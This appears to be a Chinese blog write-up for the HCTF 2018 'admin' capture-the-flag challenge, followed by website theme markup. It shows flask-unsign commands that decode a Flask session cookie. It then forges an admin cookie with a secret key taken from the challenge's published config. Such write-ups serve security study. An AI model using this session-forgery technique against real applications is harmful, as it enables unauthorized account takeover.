+<h3 id="五、-HCTF-2018-admin"><a href="#五、-HCTF-2018-admin" class="headerlink" title="五、[HCTF 2018]admin"></a>五、[HCTF 2018]admin</h3><p>有一个注册界面</p>
+<p><img src="/2019/11/19/%E4%B9%8B%E5%89%8D%E7%9A%84/flask%E4%B8%ADsession%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B/4.png" alt="img"></p>
+<p>我们注册一个</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">st4ck</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">123qwe</span><br></pre></td></tr></table></figure>
+
+<p>的账号，然后session解密</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\<span class="number">38138</span>\Desktop&gt;flask-unsign --decode --cookie <span class="string">&quot;.eJw9kEGLwjAQhf_KkrOHNtaL4GGX1mBhJlRSQ-Yibq22iXGhVagR__sGF_YwpzfvmzfvyfanoR07trwN93bG9v2RLZ_s45stGaiaS00dCfMgv-viOLKlB2-C1NVE-WZOAjIpSkd5aY1eXyBsFlIXKYqdx5wcKbRkPzOpHCfVpKQ2E-RowRcLE1wGAeZojz3wnUNecxPvyBwSFOtOiopL1cQMdQIaHSo3kS57UFsHNu5Y7I0vONpqxV4z1ozDaX_7ce31_wUUeCFLF1TnCfMqWiCR6uhRw0Sq7CA0D7ImRoBA6stjKFKqVm9c7w_n9p_Urrdlff5TrgcfBTbessaxGbuP7fDujaUJe_0C4HFsfw.Xbn_9Q.LN7SQgH0-wJ_7nD5E8h8KRKXEKM&quot;</span></span><br><span class="line">&#123;<span class="string">&#x27;_fresh&#x27;</span>: <span class="literal">True</span>, <span class="string">&#x27;_id&#x27;</span>: <span class="string">b&#x27;1569fadf2feafedf2f2f39d1d27dc88bdd2caae3299a54ef46de3cf08996e75e2103c2a9c9833767b3ed7e6bea8344aa8d69769e41cd591ebb14d23463bba664&#x27;</span>, <span class="string">&#x27;csrf_token&#x27;</span>: <span class="string">b&#x27;4cef6e58144463497f5c1e2a372f67633e0f715e&#x27;</span>, <span class="string">&#x27;image&#x27;</span>: <span class="string">b&#x27;xTIR&#x27;</span>, <span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;st4ck&#x27;</span>, <span class="string">&#x27;user_id&#x27;</span>: <span class="string">&#x27;10&#x27;</span>&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在修改密码的地方获得github地址<br><code>https://github.com/woadsl1234/hctf_flask/</code><br>在config.py里获得<code>SECRET_KEY = os.environ.get(&#39;SECRET_KEY&#39;) or &#39;ckj123&#39;</code><br>于是我们拿着ckj123来伪造</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\<span class="number">38138</span>\Desktop&gt;flask-unsign --sign --cookie <span class="string">&quot;&#123;&#x27;_fresh&#x27;: True, &#x27;_id&#x27;: b&#x27;1569fadf2feafedf2f2f39d1d27dc88bdd2caae3299a54ef46de3cf08996e75e2103c2a9c9833767b3ed7e6bea8344aa8d69769e41cd591ebb14d23463bba664&#x27;, &#x27;csrf_token&#x27;: b&#x27;4cef6e58144463497f5c1e2a372f67633e0f715e&#x27;, &#x27;image&#x27;: b&#x27;xTIR&#x27;, &#x27;name&#x27;: &#x27;admin&#x27;, &#x27;user_id&#x27;: &#x27;10&#x27;&#125;&quot;</span> --secret <span class="string">&quot;ckj123&quot;</span></span><br><span class="line">.eJw9kEGLwjAQhf_KkrOHNupF8LBLa7AwEyqpIXMRbattYlyoCjXif9_ggoc5vXnfvHlPtjsO7bVji9twbyds1zds8WRfB7ZgoCouNXUkzIP8tovjyBYevAlSlyNl6ykJmElROMoKa_TqDGE9lzpPUWw9ZuRIoSX7PZPKcVJ1Smo9QoYWfD43wc0gwBRt0wPfOuQVN_GOzCBBseqkKLlUdcxQJaDRoXIj6aIHtXFg447F3vicoy2X7DVh9XU47m6_rr18XkCBZ7J0RnUaMSujBRKpGo8aRlJFB6F-kDUxAgRSPx5DnlK5fON6vz-1H1K72hTV6V-57H0U2L7x_YVN2P3aDu_eWJqw1x_isWyf.XboBVw.SUcm9Kffci1R5O3u9w-lcq21QMo</span><br></pre></td></tr></table></figure>
+
+<p>在浏览器修改cookie中的session值后直接就拿到了flag</p>
+
+        </article>
+      </div>
+    </div>
+  </main>
+
+  <section id="about" class="about-window">
+  <a class="folder-backdrop" href="#"></a>
+  <div class="window wide reveal" style="--delay: 140ms;">
+    <div class="window-bar">
+      <div class="traffic">
+        <a class="traffic-dot red traffic-button" href="/" aria-label="Close"></a>
+        <span class="traffic-dot yellow"></span>
+        <button class="traffic-dot green traffic-button traffic-max" type="button" aria-label="Maximize"></button>
+      </div>
+      <div class="window-title">关于本机</div>
+      <div class="window-actions">
+        <a class="window-link" href="#">Close</a>
+      </div>
+    </div>
+    <div class="window-body about-body">
+      <div class="about-card">
+        <div class="about-brand">
+          <div class="about-logo">
+            <svg viewBox="0 0 24 24" aria-hidden="true">
+              <path d="M16.36 2.2c0 1.05-.43 2.06-1.15 2.8-.8.83-2.12 1.47-3.25 1.39-.13-1.11.34-2.2 1.1-2.95.75-.81 2.06-1.42 3.3-1.24z"/>
+              <path d="M19.2 8.3c-.97-1.23-2.32-1.95-3.59-1.95-1.69 0-2.4.81-3.58.81-1.21 0-2.12-.79-3.6-.79-1.43 0-2.95.87-3.92 2.36-1.37 2.1-1.13 6.05 1.08 9.42.8 1.21 1.86 2.57 3.23 2.56 1.19-.01 1.53-.76 3.2-.76 1.67 0 1.98.76 3.19.75 1.41-.01 2.55-1.51 3.33-2.72.58-.89.8-1.34 1.24-2.35-3.26-1.24-3.78-5.87-.58-7.33z"/>
+            </svg>
+          </div>
+          <div class="about-title">MacBook Pro</div>
+          <div class="about-sub">16-inch, 2099</div>
+        </div>
+        <div class="about-specs">
+          <div class="about-row">
+            <span class="about-key">内存</span>
+            <span class="about-val">256 GB 2667 MHz DDR4</span>
+          </div>
+          <div class="about-row">
+            <span class="about-key">处理器</span>
+            <span class="about-val">Apple M9 Pro</span>
+          </div>
+          <div class="about-row">
+            <span class="about-key">显卡</span>
+            <span class="about-val">Neural X 32-Core</span>
+          </div>
+          <div class="about-row">
+            <span class="about-key">序列号</span>
+            <span class="about-val">MACF-2099-A1B2C3</span>
+          </div>
+          <div class="about-row">
+            <span class="about-key">系统</span>
+            <span class="about-val">macOS 15.2</span>
+          </div>
+          <div class="about-row">
+            <span class="about-key">主题作者</span>
+            <span class="about-val">bkfish</span>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+  
+
+<section id="music" class="tool-window music-window">
+  <a class="folder-backdrop" href="#"></a>
+  <div class="window wide reveal" style="--delay: 140ms;">
+    <div class="window-bar">
+      <div class="traffic">
+        <a class="traffic-dot red traffic-button" href="/" aria-label="Close"></a>
+        <span class="traffic-dot yellow"></span>
+        <button class="traffic-dot green traffic-button traffic-max" type="button" aria-label="Maximize"></button>
+      </div>
+      <div class="window-title">Music</div>
+      <div class="window-actions">
+        <a class="window-link" href="#">Close</a>
+        
+      </div>
+    </div>
+    <div class="window-body tool-body music-body">
+      
+        <div class="empty-state">
+          <div class="empty-title">未发现本地音乐</div>
+          <div class="empty-sub">把 MP3 放在 `source/music/`（或在主题配置里设置 `desktop.music_dir`）</div>
+        </div>
+      
+    </div>
+  </div>
+</section>
+
+  <section id="search" class="search-window" data-index-url="/mac-search.json">
+  <a class="folder-backdrop" href="#"></a>
+  <div class="window wide reveal" style="--delay: 140ms;">
+    <div class="window-bar">
+      <div class="traffic">
+        <a class="traffic-dot red traffic-button" href="/" aria-label="Close"></a>
+        <span class="traffic-dot yellow"></span>
+        <button class="traffic-dot green traffic-button traffic-max" type="button" aria-label="Maximize"></button>
+      </div>
+    <div class="window-title">聚焦搜索</div>
+      <div class="window-actions">
+        <a class="window-link" href="#">Close</a>
+      </div>
+    </div>
+    <div class="window-body search-body">
+      <div class="search-input-wrap">
+        <input id="search-input" class="search-input" type="search" placeholder="搜索文章..." autocomplete="off">
+        <span class="search-hint">⌘K</span>
+      </div>
+      <ul id="search-results" class="search-results"></ul>
+      <div id="search-empty" class="search-empty">未找到结果</div>
+    </div>
+  </div>
+</section>
+
+  <div class="dock">
+  <div class="dock-inner">
+    <span class="dock-item app finder">
+      <span class="dock-icon">
+        <svg class="dock-svg" viewBox="0 0 24 24" aria-hidden="true">
+          <path d="M4 6.5c0-1.4 1.1-2.5 2.5-2.5h11c1.4 0 2.5 1.1 2.5 2.5v11c0 1.4-1.1 2.5-2.5 2.5h-11C5.1 20 4 18.9 4 17.5z"/>
+          <path d="M12 4v16"/>
+          <circle cx="9" cy="10" r="1" fill="currentColor"/>
+          <circle cx="15" cy="10" r="1" fill="currentColor"/>
+          <path d="M8.5 14.5c1 1 2.1 1.5 3.5 1.5s2.5-.5 3.5-1.5"/>
+        </svg>
+      </span>
+      <span class="dock-label">Finder</span>
+    </span>
+    <a class="dock-item app spotlight" href="#search">
+      <span class="dock-icon">
+        <svg class="dock-svg" viewBox="0 0 24 24" aria-hidden="true">
+          <circle cx="11" cy="11" r="5.5"/>
+          <path d="M15.5 15.5L20 20"/>
+        </svg>
+      </span>
+      <span class="dock-label">聚焦搜索</span>
+    </a>
+    <a class="dock-item app notes" href="#notes">
+      <span class="dock-icon">
+        <svg class="dock-svg" viewBox="0 0 24 24" aria-hidden="true">
+          <rect x="5" y="4.5" width="14" height="15" rx="2"/>
+          <path d="M8 8h8M8 11.5h8M8 15h5"/>
+        </svg>
+      </span>
+      <span class="dock-label">文章清单</span>
+    </a>
+    <span class="dock-item app safari">
+      <span class="dock-icon">
+        <svg class="dock-svg" viewBox="0 0 24 24" aria-hidden="true">
+          <circle cx="12" cy="12" r="8"/>
+          <path d="M12 7l2.8 5.2-5.2 2.8z"/>
+        </svg>
+      </span>
+      <span class="dock-label">Safari</span>
+    </span>
+    <a class="dock-item app music" href="#music">
+      <span class="dock-icon">
+        <svg class="dock-svg" viewBox="0 0 24 24" aria-hidden="true">
+          <path d="M9 18a2.5 2.5 0 1 0 0-5"/>
+          <path d="M9 13V6l9-2v7"/>
+          <path d="M16 16a2.5 2.5 0 1 0 0-5"/>
+        </svg>
+      </span>
+      <span class="dock-label">Music</span>
+    </a>
+    <span class="dock-item app trash">
+      <span class="dock-icon">
+        <svg class="dock-svg" viewBox="0 0 24 24" aria-hidden="true">
+          <path d="M6 8h12l-1 11H7z"/>
+          <path d="M9 8V5h6v3M5 8h14"/>
+        </svg>
+      </span>
+      <span class="dock-label">Trash</span>
+    </span>
+    <span class="dock-divider"></span>
+    
+    
+      
+      <a class="dock-item tool" href="#tool-flag">
+        <span class="dock-icon">
+          <span class="tool-letter">F</span>
+        </span>
+        <span class="dock-label">flag</span>
+      </a>
+    
+      
+      <a class="dock-item tool" href="#tool-bomb">
+        <span class="dock-icon">
+          <span class="tool-letter">B</span>
+        </span>
+        <span class="dock-label">bomb</span>
+      </a>
+    
+      
+      <a class="dock-item tool" href="#tool-sudoku">
+        <span class="dock-icon">
+          <span class="tool-letter">S</span>
+        </span>
+        <span class="dock-label">sudoku</span>
+      </a>
+    
+  </div>
+</div>
+
+
+  <!-- embed resize script removed: fixed-height iframe -->
+</body>
+</html>
